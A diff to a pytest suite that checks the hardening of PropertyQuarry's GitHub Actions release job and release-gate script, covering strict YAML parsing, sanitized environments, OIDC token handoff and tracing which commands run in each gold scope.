@@ -11,13 +11,483 @@ from pathlib import Path
 import pytest
 
 from scripts import check_property_security_posture as property_security_posture
+import yaml
 
 
 ROOT = Path(__file__).resolve().parents[1]
+RELEASE_SUPERVISOR = (
+    "/usr/libexec/propertyquarry-release-control/"
+    "propertyquarry-release-supervisor-v2"
+)
+RELEASE_JOB_NEEDS = [
+    "propertyquarry-protected-dispatch-inputs",
+    "propertyquarry-ordinary-ci-success",
+    "propertyquarry-flagship-security",
+    "propertyquarry-security-bootstrap-attestation",
+    "propertyquarry-continuous-ux",
+]
+RELEASE_JOB_CONDITION = (
+    "${{ always() && github.event_name == 'workflow_dispatch' "
+    "&& github.repository == 'ArchonMegalon/property' "
+    "&& github.ref == 'refs/heads/main' && inputs.run_launch_authority == true "
+    "&& inputs.run_activation_journey != true "
+    "&& needs['propertyquarry-protected-dispatch-inputs'].result == 'success' "
+    "&& needs['propertyquarry-ordinary-ci-success'].result == 'success' "
+    "&& needs['propertyquarry-flagship-security'].result == 'success' "
+    "&& needs['propertyquarry-security-bootstrap-attestation'].result == 'success' "
+    "&& needs['propertyquarry-continuous-ux'].result == 'success' }}"
+)
+RELEASE_JOB_ENV = {
+    "BASH_ENV": "/dev/null",
+    "ENV": "/dev/null",
+    "LD_PRELOAD": "",
+    "LD_LIBRARY_PATH": "",
+    "LD_AUDIT": "",
+    "GCONV_PATH": "",
+    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256": (
+        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
+        "attestation_sha256 }}"
+    ),
+    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID": (
+        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
+        "bootstrap_run_id }}"
+    ),
+    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST": (
+        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
+        "bootstrap_artifact_digest }}"
+    ),
+}
+
+
+class _StrictWorkflowLoader(yaml.SafeLoader):
+    """Fail closed on YAML features that can disguise executable structure."""
+
+    def compose_node(self, parent, index):  # type: ignore[no-untyped-def]
+        if self.check_event(yaml.AliasEvent):
+            raise yaml.constructor.ConstructorError(
+                None, None, "workflow aliases are forbidden", self.peek_event().start_mark
+            )
+        return super().compose_node(parent, index)
+
+    def construct_mapping(self, node, deep=False):  # type: ignore[no-untyped-def]
+        if not isinstance(node, yaml.MappingNode):
+            raise yaml.constructor.ConstructorError(
+                None, None, "expected a workflow mapping", node.start_mark
+            )
+        mapping = {}
+        for key_node, value_node in node.value:
+            if key_node.tag == "tag:yaml.org,2002:merge":
+                raise yaml.constructor.ConstructorError(
+                    None, None, "workflow merge keys are forbidden", key_node.start_mark
+                )
+            key = self.construct_object(key_node, deep=deep)
+            try:
+                duplicate = key in mapping
+            except TypeError as exc:
+                raise yaml.constructor.ConstructorError(
+                    None, None, "workflow mapping keys must be scalar", key_node.start_mark
+                ) from exc
+            if duplicate:
+                raise yaml.constructor.ConstructorError(
+                    None, None, f"duplicate workflow key: {key!r}", key_node.start_mark
+                )
+            mapping[key] = self.construct_object(value_node, deep=deep)
+        return mapping
+
+
+def _strict_workflow_document(workflow: str) -> dict[str, object]:
+    document = yaml.load(workflow, Loader=_StrictWorkflowLoader)
+    assert type(document) is dict
+    return document
+
+
+def _expected_release_supervisor_run(operation: str) -> str:
+    assert operation in {"release-preflight", "release-run"}
+    lines = [
+        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
+        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID}" =~ ^[1-9][0-9]*$ ]]',
+        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST}" =~ ^sha256:[0-9a-f]{64}$ ]]',
+        'exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"',
+        "unset ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+        "exec /usr/bin/env -i \\",
+        "  PATH=/usr/sbin:/usr/bin:/sbin:/bin \\",
+        "  HOME=/nonexistent \\",
+        "  LANG=C \\",
+        "  LC_ALL=C \\",
+        '  ACTIONS_ID_TOKEN_REQUEST_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}" \\',
+        "  PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\",
+        '  GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \\',
+        '  GITHUB_REF="${GITHUB_REF}" \\',
+        '  GITHUB_SHA="${GITHUB_SHA}" \\',
+        '  GITHUB_WORKFLOW_REF="${GITHUB_WORKFLOW_REF}" \\',
+        '  GITHUB_WORKFLOW_SHA="${GITHUB_WORKFLOW_SHA}" \\',
+        '  GITHUB_RUN_ID="${GITHUB_RUN_ID}" \\',
+        '  GITHUB_RUN_ATTEMPT="${GITHUB_RUN_ATTEMPT}" \\',
+        '  GITHUB_JOB="${GITHUB_JOB}" \\',
+        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256}" \\',
+        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID}" \\',
+        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST}" \\',
+        f"  {RELEASE_SUPERVISOR} \\",
+        f"    {operation}",
+    ]
+    return "\n".join(lines) + "\n"
+
+
+def _assert_exact_v2_release_job(workflow: str) -> dict[str, object]:
+    document = _strict_workflow_document(workflow)
+    assert "env" not in document
+    assert "defaults" not in document
+    jobs = document.get("jobs")
+    assert type(jobs) is dict
+    release_job = jobs.get("propertyquarry-release-v2")
+    assert type(release_job) is dict
+    for job_name, candidate_job in jobs.items():
+        assert type(job_name) is str
+        assert type(candidate_job) is dict
+        if job_name == "propertyquarry-release-v2":
+            continue
+        runner = candidate_job.get("runs-on")
+        runner_labels = runner if type(runner) is list else [runner]
+        assert "propertyquarry-release-controller-v2" not in runner_labels
+        assert "propertyquarry-release-controller-v2" not in yaml.safe_dump(runner)
+        assert RELEASE_SUPERVISOR not in yaml.safe_dump(candidate_job)
+    assert set(release_job) == {
+        "needs",
+        "if",
+        "timeout-minutes",
+        "concurrency",
+        "environment",
+        "permissions",
+        "runs-on",
+        "env",
+        "steps",
+    }
+    assert release_job["needs"] == RELEASE_JOB_NEEDS
+    assert release_job["if"] == RELEASE_JOB_CONDITION
+    assert type(release_job["timeout-minutes"]) is int
+    assert release_job["timeout-minutes"] == 180
+    assert release_job["concurrency"] == {
+        "group": "propertyquarry-release-lifecycle-v2",
+        "cancel-in-progress": False,
+    }
+    assert release_job["environment"] == {"name": "propertyquarry-production"}
+    assert release_job["permissions"] == {"contents": "none", "id-token": "write"}
+    assert release_job["runs-on"] == [
+        "self-hosted",
+        "propertyquarry-release-controller-v2",
+    ]
+    assert release_job["env"] == RELEASE_JOB_ENV
+    steps = release_job["steps"]
+    assert type(steps) is list and len(steps) == 2
+    expected_steps = (
+        (
+            "Request non-authorizing release preflight from the installed supervisor",
+            "release-preflight",
+        ),
+        (
+            "Request the atomic release lifecycle from the installed supervisor",
+            "release-run",
+        ),
+    )
+    for step, (name, operation) in zip(steps, expected_steps, strict=True):
+        assert type(step) is dict
+        assert set(step) == {"name", "shell", "run"}
+        assert step["name"] == name
+        assert step["shell"] == "/bin/bash --noprofile --norc -p -euo pipefail {0}"
+        assert step["run"] == _expected_release_supervisor_run(operation)
+    return release_job
 
 
 def _read(path: str) -> str:
     return (ROOT / path).read_text(encoding="utf-8")
+
+
+def test_property_release_gate_splits_core_and_advanced_visual_claim_scope() -> None:
+    release_gate = _read("scripts/property_release_gates.sh")
+
+    assert 'gold_scope="${PROPERTYQUARRY_GOLD_SCOPE:-core}"' in release_gate
+    assert 'if [[ "${1:-}" == "--gold-scope" ]]' in release_gate
+    assert "core|advanced_visual)" in release_gate
+    assert (
+        "PROPERTYQUARRY_GOLD_SCOPE/--gold-scope must be core or advanced_visual"
+        in release_gate
+    )
+    assert release_gate.count('--gold-scope "${gold_scope}"') == 2
+    assert '--claim-scope "${gold_scope}"' in release_gate
+    assert 'if [[ "${gold_scope}" == "advanced_visual" ]]' in release_gate
+    assert release_gate.count(
+        'if [[ "${gold_scope}" == "advanced_visual" ]]'
+    ) >= 5
+    assert "advanced_visual_gold_args=()" in release_gate
+    assert '"${advanced_visual_gold_args[@]}"' in release_gate
+    assert "scripts/propertyquarry_advanced_visual_gold_binding.py" in release_gate
+    assert "--advanced-visual-binding-receipt" in release_gate
+    assert (
+        '\nPYTHONPATH=ea "${PYTHON_BIN}" scripts/property_runtime_reconstruction_smoke.py'
+        in release_gate
+    )
+    assert (
+        '\nPYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_3d_browser_gate.py'
+        in release_gate
+    )
+    assert (
+        '\n    PYTHONPATH=ea "${PYTHON_BIN}" scripts/property_scene_video_readiness_report.py'
+        in release_gate
+    )
+
+
+@pytest.mark.parametrize(
+    "manifest_digest, expected_error",
+    [
+        ("", "controller-bound runtime-manifest SHA-256"),
+        ("A" * 64, "must be an exact lowercase unprefixed 64-hex digest"),
+        (
+            "sha256:" + "ab" * 32,
+            "must be an exact lowercase unprefixed 64-hex digest",
+        ),
+        ("ab" * 31, "must be an exact lowercase unprefixed 64-hex digest"),
+        ("0" * 64, "must be a non-placeholder digest"),
+    ],
+)
+def test_property_release_gate_rejects_untrusted_runtime_manifest_digest(
+    manifest_digest: str,
+    expected_error: str,
+) -> None:
+    result = subprocess.run(
+        ["/bin/bash", str(ROOT / "scripts/property_release_gates.sh")],
+        cwd=ROOT,
+        env={
+            "PATH": os.environ["PATH"],
+            "PROPERTYQUARRY_DR_BACKUP_RECEIPT": "unused-backup.json",
+            "PROPERTYQUARRY_DR_RESTORE_RECEIPT": "unused-restore.json",
+            "PROPERTYQUARRY_RELEASE_COMMIT_SHA": "1" * 40,
+            "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
+            "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID": "release-test",
+            "PROPERTYQUARRY_EXPECTED_RELEASE_MANIFEST_SHA256": manifest_digest,
+            "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_PATH": (
+                "/usr/bin/chromium"
+            ),
+            "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_SHA256": (
+                "abcdef0123456789" * 4
+            ),
+        },
+        text=True,
+        capture_output=True,
+        timeout=10,
+        check=False,
+    )
+
+    assert result.returncode == 2
+    assert expected_error in result.stderr
+
+
+def test_property_release_gate_execution_trace_never_touches_advanced_state_in_core(
+    tmp_path: Path,
+) -> None:
+    stub_dir = tmp_path / "bin"
+    stub_dir.mkdir()
+    trace_path = tmp_path / "release-gate.trace"
+    shared_env_path = tmp_path / "scene-video-shared.env"
+    shared_env_path.write_text("PROVIDER_ACCOUNT_PLACEHOLDER=bound\n", encoding="utf-8")
+    receipt_path = tmp_path / "required-receipt.json"
+    receipt_path.write_text("{}\n", encoding="utf-8")
+    mixed_drop_root = tmp_path / "MAGICFIT-OMAGIC-MIXED-DROP-SENTINEL"
+    forbidden_advanced_commands = (
+        "discover_property_tour_exports.py",
+        "materialize_property_tour_export_manifest.py",
+        "verify_property_tour_vendor_tooling.py",
+        "property_scene_video_shared_env.py",
+        "merge_scene_video_provider_accounts_env.py",
+        "property_scene_video_readiness_report.py",
+        "verify_property_scene_video_readiness.py",
+        "property_scene_video_runtime_status.py",
+        "materialize_scene_video_provider_refresh_packet.py",
+        "verify_scene_video_provider_refresh_packet.py",
+        "propertyquarry_notify_scene_video_provider_refresh.py",
+        "propertyquarry_walkthrough_provider_proof_gate.py",
+        "propertyquarry_walkthrough_quality_gate.py",
+        "propertyquarry_advanced_visual_gold_binding.py",
+    )
+    python_stub = stub_dir / "python-stub"
+    python_stub.write_text(
+        "#!/bin/sh\n"
+        "printf 'python\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
+        "if [ \"$PQ_RELEASE_SCOPE\" = core ]; then\n"
+        + "".join(
+            f"  case \"$*\" in *{token}*) exit 97 ;; esac\n"
+            for token in forbidden_advanced_commands
+        )
+        + "fi\n"
+        "exit 0\n",
+        encoding="utf-8",
+    )
+    python_stub.chmod(0o700)
+    docker_stub = stub_dir / "docker"
+    docker_stub.write_text(
+        "#!/bin/sh\n"
+        "printf 'docker\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
+        "if [ \"$PQ_RELEASE_SCOPE\" = core ]; then\n"
+        "  case \"$*\" in *discover_property_tour_exports.py*|*materialize_property_tour_export_manifest.py*|*verify_property_tour_vendor_tooling.py*|*property_scene_video*|*scene-video*|*property_scene_video_shared.env*) exit 98 ;; esac\n"
+        "fi\n"
+        "exit 0\n",
+        encoding="utf-8",
+    )
+    docker_stub.chmod(0o700)
+    bash_stub = stub_dir / "bash"
+    bash_stub.write_text(
+        "#!/bin/sh\n"
+        "printf 'bash\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
+        "exit 0\n",
+        encoding="utf-8",
+    )
+    bash_stub.chmod(0o700)
+    release_gate_under_test = tmp_path / "property_release_gates.sh"
+    release_gate_source = _read("scripts/property_release_gates.sh")
+    release_gate_source = release_gate_source.replace(
+        "PATH=/usr/sbin:/usr/bin:/sbin:/bin",
+        f"PATH={stub_dir}:/usr/sbin:/usr/bin:/sbin:/bin",
+        1,
+    ).replace(
+        'EA_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"',
+        f'EA_ROOT="{ROOT}"',
+        1,
+    )
+    release_gate_under_test.write_text(release_gate_source, encoding="utf-8")
+    release_gate_under_test.chmod(0o700)
+
+    base_env = {
+        **os.environ,
+        "PATH": f"{stub_dir}:{os.environ['PATH']}",
+        "PYTHON_BIN": str(python_stub),
+        "PQ_RELEASE_TRACE": str(trace_path),
+        "PROPERTYQUARRY_DR_BACKUP_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_DR_RESTORE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_RELEASE_COMMIT_SHA": "1" * 40,
+        "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
+        "PROPERTYQUARRY_EXPECTED_RELEASE_COMMIT_SHA": "1" * 40,
+        "PROPERTYQUARRY_EXPECTED_RELEASE_REPOSITORY": "owner/property",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_PUBLIC_ORIGIN": (
+            "https://propertyquarry.invalid"
+        ),
+        "PROPERTYQUARRY_EXPECTED_RELEASE_BRANCH": "main",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID": "propertyquarry-test-deploy",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_ARTIFACT_SET": "global-core",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_LABEL": "flagship-test",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_GENERATED_AT": "2026-07-19T12:00:00Z",
+        "PROPERTYQUARRY_EXPECTED_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
+        "PROPERTYQUARRY_EXPECTED_REPLICA_ID": "propertyquarry-web-1",
+        "PROPERTYQUARRY_EXPECTED_WEB_IMAGE": "web@sha256:" + "8" * 64,
+        "PROPERTYQUARRY_EXPECTED_RENDER_IMAGE": "render@sha256:" + "9" * 64,
+        "PROPERTYQUARRY_EXPECTED_RELEASE_MANIFEST_SHA256": (
+            "0123456789abcdef" * 4
+        ),
+        "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_PATH": (
+            "/usr/bin/chromium"
+        ),
+        "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_SHA256": (
+            "abcdef0123456789" * 4
+        ),
+        "PROPERTYQUARRY_SLO_METRICS_SNAPSHOT": str(receipt_path),
+        "PROPERTYQUARRY_SLO_METRICS_PROBE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_MONITORING_RUNTIME_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_PROMETHEUS_RANGE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_PROMETHEUS_RANGE_RESPONSE": str(receipt_path),
+        "PROPERTYQUARRY_ALERT_DELIVERY_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_CONTINUOUS_UX_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_FAILURE_STATE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_ACTIVATION_TO_VALUE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_PROVIDER_CATALOG_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_EVIDENCE_OVERLAY_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_RYBBIT_EVIDENCE_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_PUBLIC_ORIGIN": "https://propertyquarry.invalid",
+        "PROPERTYQUARRY_PERFORMANCE_TARGET_URL": (
+            "https://propertyquarry.invalid/app/search"
+        ),
+        "PROPERTYQUARRY_LIVE_PROBE_SECRET": "test-release-probe-secret-32-bytes-minimum",
+        "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL": "https://propertyquarry.invalid",
+        "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE": (
+            "/app/research/perf-candidate-1020?run_id=run-gold-mobile"
+        ),
+        "PROPERTYQUARRY_LIVE_PRINCIPAL_ID": "pq-live-mobile-smoke",
+        "PROPERTYQUARRY_ACCESSIBILITY_PUBLIC_TOUR_ROUTE": (
+            "/tours/flagship-proof"
+        ),
+        "PROPERTYQUARRY_RELEASE_SECURITY_RECEIPT": str(receipt_path),
+        "PROPERTYQUARRY_RELEASE_SECURITY_WORKFLOW_BINDING": str(receipt_path),
+        "PROPERTYQUARRY_WORKFLOW_HEAD_SHA": "1" * 40,
+        "PROPERTYQUARRY_WORKFLOW_RUN_ID": "12345",
+        "PROPERTYQUARRY_WORKFLOW_RUN_ATTEMPT": "1",
+        "DATABASE_URL": "postgresql://property:test@db.invalid/property",
+        "TEABLE_BASE_URL": "https://teable.invalid",
+        "TEABLE_API_KEY": "test-teable-key",
+        "PROPERTYQUARRY_EVIDENCE_OVERLAY_TEABLE_BASE_ID": "base-a",
+        "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN": "https://teable.invalid",
+        "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256": "3" * 64,
+        "PROPERTYQUARRY_RYBBIT_ORIGIN": "https://rybbit.invalid",
+        "PROPERTYQUARRY_RYBBIT_SITE_ID": "site-a",
+        "PROPERTYQUARRY_RYBBIT_SITE_ID_SHA256": "4" * 64,
+        "PROPERTYQUARRY_RYBBIT_API_KEY": "test-rybbit-key",
+        "PROPERTYQUARRY_RYBBIT_SITE_API_URL": "https://rybbit.invalid/site",
+        "PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL": (
+            "https://rybbit.invalid/has-data"
+        ),
+        "PROPERTYQUARRY_RYBBIT_EVENTS_API_URL": (
+            "https://rybbit.invalid/events"
+        ),
+        "PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN": "test-telegram-token",
+        "PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID": "test-chat",
+        "PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE": str(shared_env_path),
+        "PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE": (
+            "/run/propertyquarry/advanced-scene-video.env"
+        ),
+        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED": "1",
+        "PROPERTYQUARRY_TOUR_EXPORT_INCOMING_DIR": str(mixed_drop_root),
+        "PROPERTYQUARRY_TOUR_EXPORT_DROP_DIR": str(mixed_drop_root),
+        "PROPERTYQUARRY_GOLD_NOTIFICATION_ENABLED": "0",
+    }
+
+    traces: dict[str, str] = {}
+    for scope in ("core", "advanced_visual"):
+        trace_path.write_text("", encoding="utf-8")
+        result = subprocess.run(
+            [
+                str(release_gate_under_test),
+                "--gold-scope",
+                scope,
+            ],
+            cwd=ROOT,
+            env={**base_env, "PQ_RELEASE_SCOPE": scope},
+            text=True,
+            capture_output=True,
+            timeout=30,
+            check=False,
+        )
+        assert result.returncode == 0, (scope, result.stdout, result.stderr)
+        traces[scope] = trace_path.read_text(encoding="utf-8")
+        if scope == "core":
+            assert not mixed_drop_root.exists()
+
+    core_trace = traces["core"]
+    advanced_trace = traces["advanced_visual"]
+    assert core_trace.count(
+        "--expected-release-manifest-sha256 " + "0123456789abcdef" * 4
+    ) == 2
+    for token in forbidden_advanced_commands:
+        assert token not in core_trace
+    assert "property_scene_video_shared.env" not in core_trace
+    assert str(mixed_drop_root) not in core_trace
+    for token in forbidden_advanced_commands:
+        if token == "merge_scene_video_provider_accounts_env.py":
+            continue
+        assert token in advanced_trace
+    assert "/run/propertyquarry/advanced-scene-video.env" in advanced_trace
+    assert str(mixed_drop_root) in advanced_trace
+    assert not list(tmp_path.rglob("README.propertyquarry-export.txt"))
+    assert not any(
+        path.name.lower() in {"magicfit", "omagic"}
+        for path in tmp_path.rglob("*")
+        if path.is_dir()
+    )
 
 
 def _security_posture_failures_with_file_mutation(
@@ -126,6 +596,7 @@ def _run_schema_quiesce_scenario(
     *,
     scenario: str,
     api_state: str,
+    worker_state: str,
     scheduler_state: str,
 ) -> tuple[subprocess.CompletedProcess[str], list[str]]:
     event_log = tmp_path / "events.log"
@@ -134,6 +605,7 @@ set -euo pipefail
 
 declare -A SERVICE_STATE=(
   [api]="${INITIAL_API_STATE}"
+  [worker]="${INITIAL_WORKER_STATE}"
   [scheduler]="${INITIAL_SCHEDULER_STATE}"
   [render]="stopped"
   [migrate]="stopped"
@@ -208,9 +680,10 @@ fake_compose() {
 
 DC=(fake_compose)
 source "${QUIESCE_HELPER}"
-PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api scheduler)
+PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler)
 database_writer_inventory_lines() {
   if [[ "${SERVICE_STATE[api]}" != "stopped" ]]; then printf 'cid-api|api\n'; fi
+  if [[ "${SERVICE_STATE[worker]}" != "stopped" ]]; then printf 'cid-worker|worker\n'; fi
   if [[ "${SERVICE_STATE[scheduler]}" != "stopped" ]]; then printf 'cid-scheduler|scheduler\n'; fi
 }
 database_writer_session_inventory_lines() { return 0; }
@@ -218,7 +691,7 @@ stop_database_writer_container() { return 0; }
 database_writer_container_is_active() { return 1; }
 propertyquarry_install_schema_quiesce_traps
 propertyquarry_quiesce_schema_writers \
-  api api scheduler scheduler render render migrate migrate 30 2
+  api api worker worker scheduler scheduler render render migrate migrate 30 2
 
 case "${SCENARIO}" in
   success)
@@ -226,6 +699,8 @@ case "${SCENARIO}" in
     propertyquarry_mark_schema_migration_committed
     SERVICE_STATE[api]="running"
     event candidate-api-ready
+    SERVICE_STATE[worker]="running"
+    event candidate-worker-ready
     SERVICE_STATE[scheduler]="running"
     event candidate-scheduler-ready
     propertyquarry_finish_schema_quiesce
@@ -258,6 +733,7 @@ esac
         "EVENT_LOG": str(event_log),
         "SCENARIO": scenario,
         "INITIAL_API_STATE": api_state,
+        "INITIAL_WORKER_STATE": worker_state,
         "INITIAL_SCHEDULER_STATE": scheduler_state,
     }
     completed = subprocess.run(
@@ -491,108 +967,279 @@ def test_legacy_compose_forwards_postgres_password_into_database_container() -> 
     assert 'POSTGRES_PASSWORD: "${POSTGRES_PASSWORD:-}"' in compose
 
 
-def test_smoke_runtime_protects_live_propertyquarry_release_gates() -> None:
+def test_smoke_runtime_uses_only_the_fixed_v2_supervisor_for_release() -> None:
     workflow = _read(".github/workflows/smoke-runtime.yml")
-    live_job = _workflow_job(workflow, "propertyquarry-live-release-gates")
+    _assert_exact_v2_release_job(workflow)
+    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
+    legacy_live_job = _workflow_job(workflow, "propertyquarry-live-release-gates")
 
+    assert workflow.count("\n  propertyquarry-release-v2:\n") == 1
+    assert f"if: {RELEASE_JOB_CONDITION}" in release_job
+    assert "timeout-minutes: 180" in release_job
+    assert "group: propertyquarry-release-lifecycle-v2" in release_job
+    assert "cancel-in-progress: false" in release_job
+    assert "environment:\n      name: propertyquarry-production" in release_job
+    assert "permissions:\n      contents: none\n      id-token: write" in release_job
+    assert "runs-on: [self-hosted, propertyquarry-release-controller-v2]" in release_job
     assert (
-        "if: ${{ github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' "
-        "&& needs['propertyquarry-ordinary-ci-success'].result == 'success' "
-        "&& needs['propertyquarry-flagship-security'].result == 'success' "
-        "&& needs['propertyquarry-continuous-ux'].result == 'success' }}"
-        in live_job
+        "shell: /bin/bash --noprofile --norc -p -euo pipefail {0}"
+        in release_job
     )
-    assert live_job.count("if:") == 2
-    assert "if: ${{ always() }}" in live_job
-    assert "environment:\n      name: propertyquarry-production" in live_job
-    assert "permissions:\n      contents: read" in live_job
-    assert "persist-credentials: false" in live_job
+    assert release_job.count(RELEASE_SUPERVISOR) == 2
+    assert release_job.count("exec /usr/bin/env -i") == 2
+    assert release_job.count("PATH=/usr/sbin:/usr/bin:/sbin:/bin") == 2
+    assert release_job.count("HOME=/nonexistent") == 2
+    assert release_job.count("LANG=C") == 2
+    assert release_job.count("LC_ALL=C") == 2
+    assert release_job.count("      - name:") == 2
+    assert release_job.index("release-preflight") < release_job.index("release-run")
+    assert release_job.count("ACTIONS_ID_TOKEN_REQUEST_URL") == 4
+    assert release_job.count(
+        'exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"'
+    ) == 2
+    assert release_job.count("unset ACTIONS_ID_TOKEN_REQUEST_TOKEN") == 2
+    assert release_job.count("PROPERTYQUARRY_OIDC_TOKEN_FD=9") == 2
     assert (
-        "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL: ${{ vars.PROPERTYQUARRY_LIVE_MOBILE_BASE_URL }}"
-        in live_job
+        'ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"'
+        not in release_job
     )
-    assert (
-        "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE: ${{ secrets.PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE }}"
-        in live_job
-    )
-    assert "PROPERTYQUARRY_LIVE_PRINCIPAL_ID: ${{ secrets.PROPERTYQUARRY_LIVE_PRINCIPAL_ID }}" in live_job
-    assert (
-        "PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN: ${{ secrets.PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN }}"
-        in live_job
-    )
-    assert (
-        "PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID: ${{ secrets.PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID }}"
-        in live_job
-    )
-    assert (
-        "PROPERTYQUARRY_LIVE_PROBE_SECRET: ${{ secrets.PROPERTYQUARRY_LIVE_PROBE_SECRET }}"
-        in live_job
-    )
-    for protected_rybbit_binding in (
-        "PROPERTYQUARRY_RYBBIT_SITE_API_URL: \"${{ format('{0}/api/sites/{1}', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
-        "PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL: \"${{ format('{0}/api/sites/{1}/has-data', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
-        "PROPERTYQUARRY_RYBBIT_EVENTS_API_URL: \"${{ format('{0}/api/sites/{1}/events?"
-        "page_size=50&past_minutes_start=10&past_minutes_end=0', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
+    for identity in (
+        "GITHUB_REPOSITORY",
+        "GITHUB_REF",
+        "GITHUB_SHA",
+        "GITHUB_WORKFLOW_REF",
+        "GITHUB_WORKFLOW_SHA",
+        "GITHUB_RUN_ID",
+        "GITHUB_RUN_ATTEMPT",
+        "GITHUB_JOB",
     ):
-        assert protected_rybbit_binding in live_job
-    assert "vars.PROPERTYQUARRY_RYBBIT_SITE_API_URL" not in live_job
-    assert "vars.PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL" not in live_job
-    assert "vars.PROPERTYQUARRY_RYBBIT_EVENTS_API_URL" not in live_job
-    assert "EA_API_TOKEN: ${{ secrets.PROPERTYQUARRY_LIVE_API_TOKEN }}" not in live_job
-    assert "PROPERTYQUARRY_RELEASE_PROBE_SECRET" not in live_job
-    assert "PROPERTYQUARRY_RELEASE_PROBE_PRINCIPAL_ID" not in live_job
-    assert "PROPERTYQUARRY_WORKFLOW_HEAD_SHA: ${{ github.sha }}" in live_job
-    assert "release_manifest_runtime_sha" in live_job
-    assert 'echo "PROPERTYQUARRY_EXPECTED_RELEASE_COMMIT_SHA=${runtime_sha}" >> "${GITHUB_ENV}"' in live_job
-    assert "property-live-workflow-binding.json" in live_job
-    assert "property-live-release-provenance.json" in live_job
